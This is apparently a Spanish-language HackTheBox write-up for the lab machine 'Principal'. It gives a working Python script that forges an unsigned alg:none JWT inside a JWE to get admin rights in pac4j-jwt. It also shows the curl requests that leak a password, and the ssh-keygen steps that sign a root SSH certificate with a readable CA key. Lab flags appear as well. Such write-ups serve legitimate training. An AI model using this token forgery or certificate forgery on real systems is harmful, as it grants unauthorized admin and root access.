---
title: "HTB Principal — Writeup"
date: 2026-06-13 00:00:00 +0200
categories: [Writeups, HackTheBox]
tags: [jwt, jwe, pac4j, alg-none, ssh-ca, certificate-forgery, linux, medium]
image:
  path: /assets/img/posts/postimage.png
  alt: HTB Principal
---

**Dificultad:** Media
**OS:** Linux
**Objetivo:** Explotar una validación JWT defectuosa en pac4j-jwt para obtener acceso admin, extraer credenciales y escalar a root forjando un certificado SSH firmado con la CA del servidor.

---

## Resumen

Principal expone en el puerto 8080 una plataforma interna basada en Jetty con `pac4j-jwt 6.0.3`. La cadena de ataque tiene tres fases: forjar un JWT con `alg:none` y `role: ROLE_ADMIN` envuelto en un JWE (usando la clave RSA pública del endpoint JWKS) para acceder a la API de administración, extraer credenciales del endpoint `/api/settings`, y abusar de que el usuario `svc-deploy` pertenece al grupo `deployers` — que puede leer la clave privada de la CA SSH del servidor — para firmar un certificado con `principal: root` y acceder como root.

---

## Reconocimiento

```bash
nmap -sCV -p- --min-rate 5000 -oN principal_full.nmap 10.129.3.224
```

Puertos relevantes:

| Puerto | Servicio | Detalle |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH |
| 8080/tcp | HTTP | Jetty — Principal Internal Platform |

El endpoint `/api/auth/jwks` devuelve la clave pública RSA del servidor en formato JWK, que será necesaria para cifrar el JWE.

---

## Fase 1: JWT `alg:none` + JWE → acceso admin

### El problema

pac4j-jwt 6.0.3 valida el JWE pero no exige un algoritmo de firma concreto en el JWT interno. Si el JWT lleva `"alg":"none"` el servidor lo acepta sin verificar la firma, siempre que vaya correctamente cifrado como JWE con la clave pública RSA del servidor.

### Obtener la clave pública

```bash
curl -s http://10.129.3.224:8080/api/auth/jwks | python3 -m json.tool
```

Guardamos el JWK y lo convertimos a PEM:

```python
from jwcrypto import jwk
import json

with open("jwks.json") as f:
    data = json.load(f)

key = jwk.JWK(**data["keys"][0])
print(key.export_to_pem(public_key=True).decode())
```

### Forjar el token

```python
from jwcrypto import jwt, jwk
import json, time, base64

# Cargar la clave pública del servidor
with open("pub.pem", "rb") as f:
    pub = jwk.JWK.from_pem(f.read())

# Construir JWT interno con alg:none (sin firma)
def b64url(data):
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',',':')).encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {"alg": "none"}
claims = {
    "sub": "attacker",
    "role": "ROLE_ADMIN",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}
unsigned_jwt = f"{b64url(header)}.{b64url(claims)}."

# Envolver en JWE con la clave pública RSA del servidor
jwe_token = jwt.JWT(
    header={"alg": "RSA-OAEP-256", "enc": "A256GCM"},
    claims=unsigned_jwt
)
jwe_token.make_encrypted_token(pub)
print(jwe_token.serialize())
```

### Usar el token

```bash
TOKEN=$(python3 forge_jwt.py)
curl -s -H "Authorization: Bearer $TOKEN" \
  http://10.129.3.224:8080/api/admin/users | python3 -m json.tool
```

---

## Fase 2: Fuga de credenciales → acceso SSH

El endpoint `/api/settings` (sólo accesible con rol admin) devuelve la configuración del servidor:

```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  http://10.129.3.224:8080/api/settings | python3 -m json.tool
```

Respuesta relevante:

```json
{
  "encryptionKey": "D3pl0y_$$H_Now42!",
  "sshCaPath": "/opt/principal/ssh/"
}
```

La contraseña del campo `encryptionKey` funciona directamente para SSH:

```bash
ssh svc-deploy@10.129.3.224
# Password: D3pl0y_$$H_Now42!
cat ~/user.txt
# 9333bfe171ed7e1a05f0d6cff2daab1b
```

---

## Fase 3: Forjar certificado SSH como root

### Análisis del entorno

```bash
id
# uid=1001(svc-deploy) gid=1001(svc-deploy) groups=1001(svc-deploy),1002(deployers)

ls -la /opt/principal/ssh/
# -r--r----- 1 root deployers ... ca       ← legible por el grupo deployers
# -rw-r--r-- 1 root root      ... ca.pub

grep TrustedUserCAKeys /etc/ssh/sshd_config
# TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

SSH confía en cualquier certificado firmado por esta CA. El grupo `deployers` puede leer la clave privada.

### Exploit

```bash
# Copiar la CA al directorio temporal
cp /opt/principal/ssh/ca /tmp/ssh_ca
chmod 600 /tmp/ssh_ca

# Generar par de claves efímero
ssh-keygen -t ed25519 -f /tmp/htb_key -N ""

# Firmar con principal: root (válido 4 horas)
ssh-keygen -s /tmp/ssh_ca -I "root-cert" -n root -V +4h /tmp/htb_key.pub

# Acceder como root
ssh -i /tmp/htb_key root@10.129.3.224
cat /root/root.txt
# eecf275ab8f1a55311aecae32e5b7853
```

---

## Por qué funciona

| Pieza | Por qué es explotable |
|-------|----------------------|
| pac4j-jwt `alg:none` | La librería no obliga a un algoritmo de firma; acepta tokens sin firma si el JWE externo es válido |
| JWE con clave pública | La clave RSA del servidor es pública y accesible en `/api/auth/jwks` |
| `/api/settings` | Endpoint admin expone credenciales en claro |
| `TrustedUserCAKeys` + grupo `deployers` | La CA privada es legible por el grupo; SSH confía en cualquier cert firmado por ella |

---

## Referencias

- [pac4j-jwt](https://www.pac4j.org/docs/authenticators/jwt.html)
- [RFC 7519 — JWT](https://datatracker.ietf.org/doc/html/rfc7519)
- [RFC 7516 — JWE](https://datatracker.ietf.org/doc/html/rfc7516)
- [ssh-keygen certificate signing](https://man.openbsd.org/ssh-keygen)
